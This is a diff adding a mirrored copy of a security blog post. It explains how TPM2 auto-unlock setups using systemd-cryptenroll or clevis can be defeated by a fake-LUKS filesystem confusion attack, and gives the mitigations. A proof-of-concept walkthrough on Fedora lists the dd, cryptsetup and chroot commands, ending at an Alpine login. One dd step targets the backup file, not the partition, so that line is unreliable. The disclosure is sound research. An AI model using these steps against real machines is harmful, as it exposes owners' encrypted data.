@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>James Routley | Feed</title>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="../styles.css"
+      media="screen"
+    />
+  </head>
+  <body>
+    <a href="/index.html">Back</a>
+    <a href="https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/">Original</a>
+    <h1>Bypassing disk encryption on systems with automatic TPM2 unlock</h1>
+    
+    <div id="readability-page-1" class="page"><div><p>Have you setup automatic disk unlocking with TPM2 and
+<code>systemd-cryptenroll</code> or <code>clevis</code>? Then
+chances are high that your disk can be decrypted by an attacker who
+just has brief physical access to your machine - with some
+preparation, 10 minutes will suffice. In this article we will
+explore how TPM2 based disk decryption works, and understand why
+many setups are vulnerable to a kind of filesystem confusion
+attack. We will follow along by exploiting two different real
+systems (Fedora + clevis, NixOS + systemd-cryptenroll).</p><pre data-lang="bash"><code data-lang="bash"><span># Examples commands used to enroll a key into the TPM. Whether your system is
+</span><span># suffers from this issue does not depend on which PCRs you choose here.
+</span><span>systemd-cryptenroll --tpm2-pcrs</span><span>=</span><span>0+2+7</span><span> --tpm2-device</span><span>=</span><span>auto </span><span>&lt;</span><span>device</span><span>&gt;
+</span><span>clevis</span><span> luks bind</span><span> -d </span><span>&lt;</span><span>device</span><span>&gt;</span><span> tpm2 </span><span>&#39;{&#34;pcr_bank&#34;:&#34;sha256&#34;,&#34;pcr_ids&#34;:&#34;0,1,2,7&#34;}&#39;
+</span></code></pre><p><strong>TL;DR:</strong> Most TPM2 unlock setups fail to verify
+the LUKS identity of the decrypted partition. Since the initrd must
+reside in an unencrypted boot partition, an attacker can inspect it
+to learn how it decrypts the disk and also what type of filesystem
+it expects to find inside. By recreating the LUKS partition with a
+known key, we can confuse the initrd into executing a malicious
+<code>init</code> executable. Since the TPM state will not be
+altered in any way by this fake partition, the original LUKS key
+can be unsealed from the TPM. Afterwards, the initial disk state
+can be fully restored and then decrypted using the obtained
+key.</p><p>You are safe if you additionally use a pin to unlock your TPM,
+or use an initrd that properly asserts the LUKS identity (which
+would involve manual work, so you&#39;d probably know if that is the
+case).</p><h2 id="the-idea-behind-tpm2-based-disk-decryption"><span><span><a href="#the-idea-behind-tpm2-based-disk-decryption" aria-label="Anchor link for: the-idea-behind-tpm2-based-disk-decryption">🔗</a></span>
+The idea behind TPM2 based disk decryption</span></h2><p>The idea behind secure and password-less disk decryption is that
+the TPM2 can store an additional LUKS key which your system can
+only retrieve, if the TPM is in a predetermined, known-good state.
+This state is recorded in the so-called Platform Configuration
+Registers (PCRs), of which there are 24 in a standard compliant
+TPM. Their intended use is described in the <a href="https://uapi-group.org/specifications/specs/linux_tpm_pcr_registry/">Linux TPM PCR Registry</a> but also neatly summarized as a table in
+the <a href="https://www.freedesktop.org/software/systemd/man/latest/systemd-cryptenroll.html"><code>systemd-cryptenroll(1)</code></a> man page.</p><p>These registers store hashes which are successively updated
+while booting based on information like the bootlaoder hash, the
+firmware in use, the booted kernel, initrd image and a lot more
+things. By establishing a chain of trust through all components
+involved in booting up to the linux userspace, we can ensure that
+altering any component will affect one or several PCRs. Storing
+data in the TPM requires you to select a list of PCRs and it will
+ensure that the data can only be retrieved again if all of these
+PCRs are in the same state as when enrolling the secret.</p><p>Several of these registers have an agreed-upon purpose and are
+updated with some specific information about your system, such as
+your board&#39;s firmware, your BIOS configuration, OptionROMs (extra
+firmware loaded from external devices such as PCIe devices after
+POST), the secure boot policy, or other things. Here&#39;s an excerpt
+from the man page from above containing some of the registers that
+are important to us:</p><table><thead><tr><th>PCR</th><th>Name</th><th>Explanation</th></tr></thead><tbody><tr><td>0</td><td>platform-code</td><td>Core system firmware executable code; changes on firmware
+updates</td></tr><tr><td>2</td><td>external-code</td><td>Extended or pluggable executable code; includes option ROMs on
+pluggable hardware</td></tr><tr><td>7</td><td>secure-boot-policy</td><td>Secure Boot state; changes when UEFI SecureBoot mode is
+enabled/disabled, or firmware certificates (PK, KEK, db, dbx, …)
+changes.</td></tr><tr><td>15</td><td>system-identity</td><td>systemd-cryptsetup(8) optionally measures the volume key of
+activated LUKS volumes into this PCR. systemd-pcrmachine.service(8)
+measures the machine-id(5) into this PCR. systemd-pcrfs@.service(8)
+measures mount points, file system UUIDs, labels, partition UUIDs
+of the root and /var/ filesystems into this PCR.</td></tr></tbody></table><p>Below this list, an interesting piece of information is given in
+the man page about the intended use of PCRs for encrypted
+volumes:</p><blockquote><p>In general, encrypted volumes would be bound to some combination
+of PCRs 7, 11, and 14 (if shim/MOK is used). In order to allow
+firmware and OS version updates, it is typically not advisable to
+use PCRs such as 0 and 2, since the program code they cover should
+already be covered indirectly through the certificates measured
+into PCR 7. Validation through certificates hashes is typically
+preferable over validation through direct measurements as it is
+less brittle in context of OS/firmware updates: the measurements
+will change on every update, but signatures should remain
+unchanged. See the Linux TPM PCR Registry for more discussion.</p></blockquote><p>If you enroll your own secure boot keys and use a Unified Kernel
+Image (UKI), then using just PCR 7 will be sufficient to ensure
+integrity up to the point where we need to unlock our disk. Some
+distributions instead ship EFI executables that are pre-signed with
+the Microsoft keys, which allows them to enable secure boot by
+default without requiring the user to generate and enroll anything
+on their own. Since this also means that the user cannot sign their
+kernel and/or initrd image, a trusted and pre-signed shim is often
+used to measure the hash of the kernel and initrd before executing
+them into PCR 9, which we would want to use in that case. Another
+approach is to have the user generate a so-called Machine Owner Key
+(MOK) if they want to sign something, in which case PCR 14 should
+be used, too.</p><p>So the exact PCR selection may change a bit depending on the
+user&#39;s setup. A quick <a href="https://github.com/search?q=cryptenroll+%2F0%5C%2B2%5C%2B7%2F&amp;type=code">search on GitHub</a> or <a href="https://duckduckgo.com/?t=h_&amp;q=cryptenroll+0%2B2%2B7&amp;ia=web">on the internet</a> reveals that many people still opt to use
+additional PCRs like 0 and 2 in addition to 7, which is of course
+fine but may result in keys becoming inaccessible when the BIOS or
+some firmware is updated - which can be annoying.</p><h3 id="a-common-vulnerable-setup"><span><span><a href="#a-common-vulnerable-setup" aria-label="Anchor link for: a-common-vulnerable-setup">🔗</a></span>
+A common (vulnerable) setup</span></h3><p>If you already have secure boot set up, configuring TPM2 unlock
+for your LUKS partition is usually very simple. Most guides will
+resort to <code>systemd-cryptenroll</code> or <code>clevis</code>
+which are different implementations that internally do some
+variation of the following:</p><ol><li>Add a newly generated key to your LUKS partition</li><li>Seal this key in your TPM based on your selection of PCRs</li><li>Store the encrypted TPM context in the LUKS token metadata
+which is required to unseal the secret at a later point in
+time</li></ol><p>Both <code>clevis</code> and <code>systemd-cryptenroll</code>
+can store tokens in other ways than a TPM2, for example using a
+FIDO2 key. I found that <code>clevis</code> also supports
+retrieving tokens from network resources, but other than that the
+two tools are very similar in what they do.
+<code>systemd-cryptenroll</code> just comes pre-packaged with
+<code>systemd</code> so it is usually a bit simpler to use. Here is
+an example:</p><pre data-lang="bash"><code data-lang="bash"><span>systemd-cryptenroll --tpm2-pcrs</span><span>=</span><span>7</span><span> --tpm2-device</span><span>=</span><span>auto /dev/nvme0n1p3
+</span></code></pre><p>In theory, the disk is now properly protected, assuming the
+kernel command line cannot be edited, right? It can only be
+decrypted if PCR 7 is unchanged, and anything we would do to the
+bootloader, kernel or initrd would affect PCR 7.</p><p>Well, of course, I wouldn&#39;t be asking if there wasn&#39;t a tiny
+caveat: Assuming all disks were mounted properly, the initrd can be
+certain that no code has been modified up to this point. But it
+does <em>not</em> automatically ensure that the data on them is
+authentic. As the very last step, the initrd will execute the
+<code>init</code> executable of the real system, which usually
+doesn&#39;t undergo any kind of signature check before it is executed.
+And why would it have to - after all it is part of the encrypted
+root partition which cannot be altered by an attacker.</p><h3 id="the-exploit"><span><span><a href="#the-exploit" aria-label="Anchor link for: the-exploit">🔗</a></span> The exploit</span></h3><p>First of all, it is important to know that the initrd will fall
+back to a password prompt, if TPM unlocking fails for whatever
+reason. A BIOS update could always cause the secure boot database
+to be altered (thus invalidating PCR 7), or somebody makes a
+mistake when updating the system and forgets to sign the kernel and
+initrd properly. In such a case you don&#39;t want to be locked out
+from your system completely, so asking for the password is a sane
+thing to do.</p><p>But that also means if we replace the encrypted partition with a
+new LUKS partition (for which we choose the password), then the TPM
+decryption will fail and we will be asked for the password, which
+we control. After entering the password, the initrd will now think
+it has decrypted the partition correctly and proceed. If we manage
+to put the correct kind of filesystem inside of our fake LUKS
+partition so that the actual mounting succeeds, we can ship a
+malicious <code>init</code> binary that now has full access to the
+unlocked TPM, thus allowing us to decrypt the original filesystem,
+which we would have to backup before creating our malicious
+partition.</p><p>Now you might think the initrd can simply verify the filesystem
+UUID before mounting it since we cannot read it from the disk, but
+remember that anything the initrd knows is public knowledge, as the
+boot partition and initrd image are not encrypted. So we can just
+reuse the same LUKS UUID and filesystem UUID if necessary.</p><h3 id="securing-the-system"><span><span><a href="#securing-the-system" aria-label="Anchor link for: securing-the-system">🔗</a></span> Securing the system</span></h3><p>To solve this, we need to be able to authenticate all encrypted
+volumes before accessing any file on them. In <a href="https://0pointer.net/blog/brave-new-trusted-boot-world.html">this
+article</a> by Lennart Poettering from October 2022, where he
+describes the state of secure boot in systemd, he mentions how the
+process should look like to make the system secure. It is a bit
+involved so let me reiterate the important part.</p><p>After a disk has been unlocked, we want to derive a value from
+its volume key (the master key used to encrypt all its data) and
+use this value to extend PCR 15. This ensures that any fake volume
+would change this value since the original volume key cannot be
+known. Using <code>systemd-cryptsetup</code> instead of
+<code>cryptsetup</code> can already take care of this by adding
+<code>tpm2-measure-pcr=yes</code> to the crypttab file.</p><p>If we now ensure that the disk decryption order is
+deterministic, then we can compare the value in PCR 15 against a
+known and signed value in the initrd. If the wrong value is
+observed, the initrd can now abort the boot process before
+executing anything malicious.</p><h3 id="many-broken-guides"><span><span><a href="#many-broken-guides" aria-label="Anchor link for: many-broken-guides">🔗</a></span> Many broken guides</span></h3><p>There are loads of guides that describe in more detail how to
+setup TPM2 based disk unlocking, and while the concept is always
+the same, you will certainly find one adjusted to your favorite
+distribution. Here&#39;s a list of guides that I found online, sorted
+by date:</p><ul><li><a href="https://jnsgr.uk/2024/04/nixos-secure-boot-tpm-fde/">Secure Boot &amp;
+TPM-backed Full Disk Encryption on NixOS</a> (2024/04, NixOS,
+systemd-cryptenroll, EDIT: updated 💙)</li><li><a href="https://forum.manjaro.org/t/howto-using-secure-boot-and-tpm2-to-unlock-luks-partition-on-boot/101626">[HowTo] Using Secure Boot and TPM2 to unlock LUKS partition on
+boot</a> (2024/01, Manjaro, systemd-cryptenroll)</li><li><a href="https://community.frame.work/t/guide-setup-tpm2-autodecrypt/39005">[GUIDE] Setup TPM2 Autodecrypt</a> (2023/10, Unspecified,
+systemd-cryptenroll, Misuse of PCR 15)</li><li><a href="https://blog.fernvenue.com/archives/debian-with-luks-and-tpm-auto-decryption/">Debian with LUKS and TPM auto decryption</a> (2023/09, Debian,
+systemd-cryptenroll)</li><li><a href="https://wiki.gentoo.org/wiki/Trusted_Platform_Module/LUKS">Gentoo
+Wiki - Trusted Platform Module/LUKS</a> (2023/05, Gentoo,
+clevis)</li><li><a href="https://221b.uk/safe-automatic-decryption-luks-partition-tpm2">Safe
+automatic decryption of LUKS partition using TPM2</a> (2023/01,
+Fedora, clevis, <a href="https://fedoramagazine.org/automatically-decrypt-your-disk-using-tpm2/">fedoramagazine</a>)</li><li><a href="https://blastrock.github.io/fde-tpm-sb.html">The
+ultimate guide to Full Disk Encryption with TPM and Secure Boot</a>
+(2022/04, Debian, tpm2-initramfs-tool)</li><li><a href="https://gist.github.com/jdoss/777e8b52c8d88eb87467935769c98a95">Decrypt
+LUKS volumes with a TPM on Fedora Linux</a> (2022/03, Fedora,
+systemd-cryptenroll)</li><li><a href="https://wiki.archlinux.org/title/User:Krin/Secure_Boot,_full_disk_encryption,_and_TPM2_unlocking_install">ArchWiki/User:Krin/Secure Boot, full disk encryption, and TPM2
+unlocking install</a> (2021/09, Arch Linux,
+systemd-cryptenroll)</li></ul><p>Unfortunately, I did not find any guide that addresses this, so
+most user setups are probably suffering from this issue. Though in
+all fairness, whether this is an issue to you obviously depends on
+your threat model. If you are using the TPM just to unlock your
+home server which nobody else has physical access to, then maybe
+this is a non-issue to you. But if you use this to protect the data
+on your laptop against theft, then chances are you want to set a
+TPM pin or implement PCR 15 verification as explained above.</p><p>Notably, I found that the ArchWiki entry of <a href="https://wiki.archlinux.org/title/Systemd-cryptenroll">systemd-cryptenroll</a>
+acknowledges this issue in a warning near the end of the
+article:</p><blockquote><p>Only binding to PCRs measured pre-boot (PCRs 0-7) opens a
+vulnerability from rogue operating systems. A rogue partition with
+metadata copied from the real root filesystem (such as partition
+UUID) can mimic the original partition. Then, initramfs will
+attempt to mount the rogue partition as the root filesystem
+(decryption failure will fall back to password entry), leaving
+pre-boot PCRs unchanged. The rogue root filesystem with files
+controlled by an attacker is still able to receive the decryption
+key for the real root partition. See Brave New Trusted Boot World
+and BitLocker documentation for additional information.</p></blockquote><p>And while this is correct, just using any of the PCRs 8-23
+doesn&#39;t automatically protect your data either. The initrd still
+has to ensure that the respective PCR is changed before executing
+the system&#39;s <code>init</code> binary, which is not done by
+default.</p><h2 id="proof-of-concept-exploitation-of-a-fedora-machine"><span><span><a href="#proof-of-concept-exploitation-of-a-fedora-machine" aria-label="Anchor link for: proof-of-concept-exploitation-of-a-fedora-machine">🔗</a></span> Proof-of-concept exploitation of a Fedora machine</span></h2><p>Now, let&#39;s have a look at a real system which we will setup in a
+similar way to how anyone else would have done it. I&#39;ve picked one
+of the Fedora articles above, but you can expect this to work for
+all of the other distributions, too. In summary, my setup included
+the following steps:</p><ul><li>Install Fedora 41, I chose an encrypted root with ext4 on
+LUKS</li><li>Enable secure boot in the BIOS (and install the Microsoft keys
+since Fedora is signed with those keys)</li></ul><p>An interesting thing we notice right away is that the Fedora
+bootloader is signed using the Microsoft keys. We&#39;ve already
+briefly talked about this in the beginning, this means it cannot
+sign the initrd at all. Instead, they have a signed shim that is
+executed after the bootloader which will calculate hashes of the
+kernel and initrd and extend PCR 9 with those values. Therefore, it
+is critical that we now include PCR 9 in our selection when
+enrolling the key to the TPM, otherwise the initrd could just be
+modified.</p><p>This approach has the advantage that the user doesn&#39;t have to
+deal with custom secure boot keys, but the downside is that every
+kernel or initrd update will affect the value in PCR 9, thus
+requiring us to re-enroll the key after rebooting on each system
+update. Here is a snapshot of my PCRs when I enrolled the key into
+the TPM. This is also the state that we need to reach later to
+succeed.</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> systemd-analyze pcrs
+</span><span>NR</span><span> NAME                SHA256
+</span><span> </span><span>0</span><span> platform-code       8c2af609e626cc1687f66ea6d0e1a3605a949319514a26e7e1a90d6a35646fa5
+</span><span> </span><span>1</span><span> platform-config     299b0462537a9505f6c63672b76a3502373c8934f08a921e1aa50d3adf4ba83d
+</span><span> </span><span>2</span><span> external-code       3d458cfe55cc03ea1f443f1562beec8df51c75e14a9fcf9a7234a13f198e7969
+</span><span> </span><span>3</span><span> external-config     3d458cfe55cc03ea1f443f1562beec8df51c75e14a9fcf9a7234a13f198e7969
+</span><span> </span><span>4</span><span> boot-loader-code    5fdbd66c267bd9513dbc569db0b389a37445e1aa463f9325ea921563e7fb37eb
+</span><span> </span><span>5</span><span> boot-loader-config  38a281376260137602e5c70f7a9057e4c55830d22a02bb5a66013d6ac2576d2f
+</span><span> </span><span>6</span><span> host-platform       3d458cfe55cc03ea1f443f1562beec8df51c75e14a9fcf9a7234a13f198e7969
+</span><span> </span><span>7</span><span> secure-boot-policy  4770a4fb1dac716feaddd77fec9a28bb2015e809a34add1a9d417eec36ec1e17
+</span><span> </span><span>8</span><span> -                   e3e23c0da36fa31767885aec7aee3180fb2f5e0b67569c3a82c2a1c3ca88a651
+</span><span> </span><span>9</span><span> kernel-initrd       091f6917b0c8788779f4d410046250e6747043a8cd1bd75bf90713cc6de30d99
+</span><span>10</span><span> ima                 2566bdf57c3aa880f7b0c480f479c0a88e0e72ae7ef3c1888035e7238bbe9257
+</span><span>11</span><span> kernel-boot         0000000000000000000000000000000000000000000000000000000000000000
+</span><span>12</span><span> kernel-config       0000000000000000000000000000000000000000000000000000000000000000
+</span><span>13</span><span> sysexts             0000000000000000000000000000000000000000000000000000000000000000
+</span><span>14</span><span> shim-policy         17cdefd9548f4383b67a37a901673bf3c8ded6f619d36c8007562de1d93c81cc
+</span><span>15</span><span> system-identity     0000000000000000000000000000000000000000000000000000000000000000
+</span><span>16</span><span> debug               0000000000000000000000000000000000000000000000000000000000000000
+</span><span>17</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>18</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>19</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>20</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>21</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>22</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>23</span><span> application-support 0000000000000000000000000000000000000000000000000000000000000000
+</span></code></pre><h4 id="inspecting-the-system"><span><span><a href="#inspecting-the-system" aria-label="Anchor link for: inspecting-the-system">🔗</a></span> Inspecting the system</span></h4><p>Now, let&#39;s pretend we don&#39;t know anything about the system and
+that we just obtained physical access to the machine, which was
+powered-off.</p><p>We start by taking the main disk out and putting it into our
+machine. You may also be able to boot a Fedora or Debian live
+image, if the owner has not wiped the Microsoft keys from their
+BIOS in favor of their own. Once booted, we start investigating the
+disk layout and partitions:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> blkid
+</span><span>/dev/nvme0n1p1:</span><span> LABEL_FATBOOT=</span><span>&#34;EFI&#34;</span><span> LABEL=</span><span>&#34;EFI&#34;</span><span> UUID=</span><span>&#34;E2AA-BB8B&#34;</span><span> BLOCK_SIZE=</span><span>&#34;512&#34;</span><span> TYPE=</span><span>&#34;vfat&#34;</span><span> PARTLABEL=</span><span>&#34;EFI System Partition&#34;</span><span> PARTUUID=</span><span>&#34;b9cd5e99-00ec-45e8-be33-72809ae30602&#34;
+</span><span>/dev/nvme0n1p2:</span><span> LABEL=</span><span>&#34;boot&#34;</span><span> UUID=</span><span>&#34;d0a1796a-5c1e-446f-8b70-2910d094d195&#34;</span><span> BLOCK_SIZE=</span><span>&#34;4096&#34;</span><span> TYPE=</span><span>&#34;ext4&#34;</span><span> PARTUUID=</span><span>&#34;e5cc6afa-285b-4bc6-8fb1-a6c5344d20a9&#34;
+</span><span>/dev/nvme0n1p3:</span><span> UUID=</span><span>&#34;779328d5-00ca-4ade-be44-6daa549642ed&#34;</span><span> TYPE=</span><span>&#34;crypto_LUKS&#34;</span><span> PARTUUID=</span><span>&#34;4e73c89f-3840-458a-ada6-0f5349ab36e1&#34;
+</span></code></pre><p>We take a quick peek at the encrypted partition, which is our
+main target:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /dev/nvme0n1p3
+</span><span>LUKS</span><span> header information
+</span><span>Version:</span><span>        2
+</span><span>Epoch:</span><span>          9
+</span><span>Metadata</span><span> area:  16384 </span><span>[</span><span>bytes</span><span>]
+</span><span>Keyslots</span><span> area:  16744448 </span><span>[</span><span>bytes</span><span>]
+</span><span>UUID:</span><span>           779328d5-00ca-4ade-be44-6daa549642ed
+</span><span># [...]
+</span><span>Tokens:
+</span><span>  </span><span>0:</span><span> clevis
+</span><span>    </span><span>Keyslot:</span><span>    1
+</span><span># [...]
+</span></code></pre><p>We can already see that the system owner has used
+<code>clevis</code> to configure the automated unlocking. What we
+want to find for now is the initrd and kernel command line, so some
+GRUB or systemd-boot configuration file. Since Fedora uses
+pre-signed images, the EFI partition will only contain the loader
+and shim, which shouldn&#39;t contain any information about the actual
+system. But the boot partition <code>/dev/nvme0n1p2</code> looks
+promising, so let&#39;s mount it and see what we find:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> mount /dev/nvme0n1p2 /mnt/boot
+</span><span>[root@localhost]#</span><span> ls</span><span> -l</span><span> /mnt/boot
+</span><span>total</span><span> 222500
+</span><span>dr-xr-xr-x.</span><span>  6 root root      4096 Jan 13 23:09 ./
+</span><span>dr-xr-xr-x.</span><span> 19 root root      4096 Jan 13 23:06 ../
+</span><span>-rw-r--r--.</span><span>  1 root root    277997 Oct 20 02:00 config-6.11.4-301.fc41.x86_64
+</span><span>drwx------.</span><span>  3 root root      4096 Jan  1  1970 efi/
+</span><span>drwx------.</span><span>  3 root root      4096 Jan 13 23:10 grub2/
+</span><span>-rw-------.</span><span>  1 root root 139254374 Jan 13 23:09 initramfs-0-rescue-868c201e807541caacd6fa6b32d5ba2e.img
+</span><span>-rw-------.</span><span>  1 root root  45514433 Jan 14 00:54 initramfs-6.11.4-301.fc41.x86_64.img
+</span><span>drwxr-xr-x.</span><span>  3 root root      4096 Jan 13 23:06 loader/
+</span><span>drwx------.</span><span>  2 root root     16384 Jan 13 23:05 lost+found/
+</span><span>-rw-r--r--.</span><span>  1 root root    182584 Jan 13 23:09 symvers-6.11.4-301.fc41.x86_64.xz
+</span><span>-rw-r--r--.</span><span>  1 root root   9968458 Oct 20 02:00 System.map-6.11.4-301.fc41.x86_64
+</span><span>-rwxr-xr-x.</span><span>  1 root root  16296296 Jan 13 23:08 vmlinuz-0-rescue-868c201e807541caacd6fa6b32d5ba2e</span><span>*
+</span><span>-rwxr-xr-x.</span><span>  1 root root  16296296 Oct 20 02:00 vmlinuz-6.11.4-301.fc41.x86_64</span><span>*
+</span><span>-rw-r--r--.</span><span>  1 root root       161 Oct 20 02:00 .vmlinuz-6.11.4-301.fc41.x86_64.hmac
+</span></code></pre><p>Great! There are the kernel and initrd images plus a
+<code>loader/</code> directory containing some GRUB entry
+configurations. We will take a look at those configuration files
+first:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> ls</span><span> -l</span><span> /mnt/boot/loader/entries
+</span><span>-rw-r--r--.</span><span> 1 root root  445 Jan 13 23:10 868c201e807541caacd6fa6b32d5ba2e-0-rescue.conf
+</span><span>-rw-r--r--.</span><span> 1 root root  369 Jan 13 23:10 868c201e807541caacd6fa6b32d5ba2e-6.11.4-301.fc41.x86_64.conf
+</span><span>[root@localhost]#</span><span> cat /boot/loader/entries/868c201e807541caacd6fa6b32d5ba2e-6.11.4-301.fc41.x86_64.conf
+</span><span>title</span><span> Fedora Linux (6.11.4-301.fc41.x86_64) </span><span>41</span><span> (Server Edition)
+</span><span>version</span><span> 6.11.4-301.fc41.x86_64
+</span><span>linux</span><span> /vmlinuz-6.11.4-301.fc41.x86_64
+</span><span>initrd</span><span> /initramfs-6.11.4-301.fc41.x86_64.img
+</span><span>options</span><span> root=UUID=1a887df4-286d-4842-bd66-d8993e8596d2 ro rd.luks.uuid=luks-779328d5-00ca-4ade-be44-6daa549642ed rhgb quiet
+</span><span>grub_users </span><span>$</span><span>grub_users
+</span><span>grub_arg --unrestricted
+</span><span>grub_class</span><span> fedora
+</span></code></pre><p>Wow, this is looks like we already found all the important
+information! Judging from the commandline syntax, this is likely an
+initrd that was generated by dracut. There seems to be a LUKS
+encrypted partition with UUID
+<code>779328d5-00ca-4ade-be44-6daa549642ed</code> and a root file
+system with UUID <code>1a887df4-286d-4842-bd66-d8993e8596d2</code>,
+which is certainly inside of the LUKS partition. The type of
+filesystem is not specified, so we are free to choose anything that
+is supported by the initramfs for our fake.</p><h4 id="planning-our-exploit"><span><span><a href="#planning-our-exploit" aria-label="Anchor link for: planning-our-exploit">🔗</a></span> Planning our exploit</span></h4><p>In theory, we&#39;d need to find out one additional thing - the
+binary that will be called by the initrd when it want&#39;s to switch
+to the real system. But the chances are very high that it is
+<code>/sbin/init</code> (this is not the case on all systems
+though, see the NixOS PoC below for an example). If our assumption
+doesn&#39;t work out, we can still double check by extracting the
+initrd later.</p><p>In order to confuse the initrd, we now need to:</p><ol><li>Backup the original LUKS parition so we can later decrypt
+it</li><li>Replace the LUKS partition with a fake LUKS partition that has
+the UUID <code>779328d5-00ca-4ade-be44-6daa549642ed</code></li><li>This LUKS partition must contain a filesystem with UUID
+<code>1a887df4-286d-4842-bd66-d8993e8596d2</code></li><li>The inner filesystem contains a <code>/sbin/init</code> binary
+that does what we want</li></ol><p>We may actually only backup the first few megabytes of the
+original LUKS partition and make sure our fake partition is exactly
+the same size as our backup. By overwriting just the beginning in
+this way we don&#39;t have to do a full disk backup, which would
+otherwise take a very long time and would require us to bring a
+spare disk with us.</p><h4 id="backup-the-beginning-of-the-original-luks-partition"><span><span><a href="#backup-the-beginning-of-the-original-luks-partition" aria-label="Anchor link for: backup-the-beginning-of-the-original-luks-partition">🔗</a></span> Backup the beginning of the original LUKS partition</span></h4><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> dd if=/dev/nvme0n1p3 of=/boot/luks-original.bak bs=64M count=1
+</span></code></pre><p>We&#39;ll abuse the free space on the boot partition to store this
+backup, which makes it easy to access later. If you don&#39;t want to
+tamper too much with the original disk, you can of course use a
+small thumb drive.</p><h4 id="create-fake-partition-and-filesystem-with-matching-uuids"><span><span><a href="#create-fake-partition-and-filesystem-with-matching-uuids" aria-label="Anchor link for: create-fake-partition-and-filesystem-with-matching-uuids">🔗</a></span> Create fake partition and filesystem with matching
+UUIDs</span></h4><p>Next, we create a <code>64MB</code> file in which we will
+prepare our partition. The size is a bit arbitrary, it just needs
+to cover the LUKS and inner filesystem header and must fit our
+exploit binary. So we initialize a new LUKS partition with the UUID
+from above, and then open it and format its contents with
+<code>ext4</code>:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> truncate</span><span> -s</span><span> 64MB /root/fakeluks
+</span><span>[root@localhost]#</span><span> cryptsetup luksFormat /root/fakeluks</span><span> --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 1234)</span><span> --uuid</span><span> 779328d5-00ca-4ade-be44-6daa549642ed
+</span><span>[root@localhost]#</span><span> cryptsetup open /root/fakeluks fakeluks</span><span> --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 1234)
+</span><span>[root@localhost]#</span><span> mkfs.ext4 /dev/mapper/fakeluks</span><span> -U</span><span> 1a887df4-286d-4842-bd66-d8993e8596d2
+</span><span>[root@localhost]#</span><span> mount /dev/mapper/fakeluks /mnt/root
+</span></code></pre><h4 id="prepare-filesystem"><span><span><a href="#prepare-filesystem" aria-label="Anchor link for: prepare-filesystem">🔗</a></span> Prepare filesystem</span></h4><p>Now we could theoretically prepare a tiny binary that directly
+extracts the key from the TPM, but it&#39;s far simpler just put a
+minimal Alpine image there and install the necessary tools to do
+that manually. This will also easily fit into <code>64MB</code>.
+Let&#39;s proceed by preparing the Alpine filesystem:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cd /mnt/root
+</span><span>[root@localhost]#</span><span> wget https://dl-cdn.alpinelinux.org/alpine/v3.21/releases/x86_64/alpine-minirootfs-3.21.2-x86_64.tar.gz
+</span><span>[root@localhost]#</span><span> tar xvf alpine-minirootfs-3.21.2-x86_64.tar.gz
+</span><span>[root@localhost]#</span><span> rm alpine-minirootfs-3.21.2-x86_64.tar.gz
+</span><span>[root@localhost]#</span><span> cat /etc/resolv.conf </span><span>&gt;</span><span> /mnt/root/etc/resolv.conf      </span><span># Just for DNS resolution at this moment, so we can install packages in the chroot
+</span><span>[</span><span>root@localhost</span><span>]</span><span># chroot /mnt/root /sbin/apk add </span><span>\                      </span><span># Install some tools that we need
+</span><span>                    </span><span>tpm2-tools</span><span> tpm2-tss-tcti-device jose cryptsetup
+</span><span>[root@localhost]#</span><span> wget</span><span> -O</span><span> /mnt/root/bin/clevis-decrypt-tpm \
+</span><span>                    </span><span>&#34;https://raw.githubusercontent.com/latchset/clevis/0839ee294a2cbb0c1ecf1749c9ca530ef9f59f8f/src/pins/tpm2/clevis-decrypt-tpm2&#34;
+</span><span>[root@localhost]#</span><span> chmod +x /mnt/root/bin/clevis-decrypt-tpm             </span><span># Helper to retrieve password from TPM2
+</span><span>[root@localhost]#</span><span> sed</span><span> -i </span><span>&#39;s/root:x/root:/&#39;</span><span> /mnt/root/etc/passwd         </span><span># Remove root password
+</span></code></pre><h4 id="overwriting-the-partition"><span><span><a href="#overwriting-the-partition" aria-label="Anchor link for: overwriting-the-partition">🔗</a></span>
+Overwriting the partition</span></h4><p>Finally, we unmount our fake filesystem and overwrite the first
+<code>64MB</code> of the original partition with it, then put the
+disk back into the original machine and reboot:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> umount /mnt/root
+</span><span>[root@localhost]#</span><span> cryptsetup close /dev/mapper/fakeluks
+</span><span>[root@localhost]#</span><span> sync
+</span><span>[root@localhost]#</span><span> dd if=/root/fakeluks of=/root/luks-original.bak bs=64M count=1
+</span></code></pre><p>We will now be asked for the LUKS password we just set, since
+the automatic decryption will obviously not trigger on our fake
+partition, which has no token metadata. After entering our password
+from above, we are greeted by the Alpine image. We can login as
+<code>root</code> without a password:</p><pre><code><span>Welcome to Alpine Linux 3.21
+</span><span>Kernel 6.11.4-301.fc41.x86_64 on an x86_64 (/dev/tty1)
+</span><span>
+</span><span>localhost login: root
+</span><span>Welcome to Alpine!
+</span><span>
+</span><span>localhost:~#
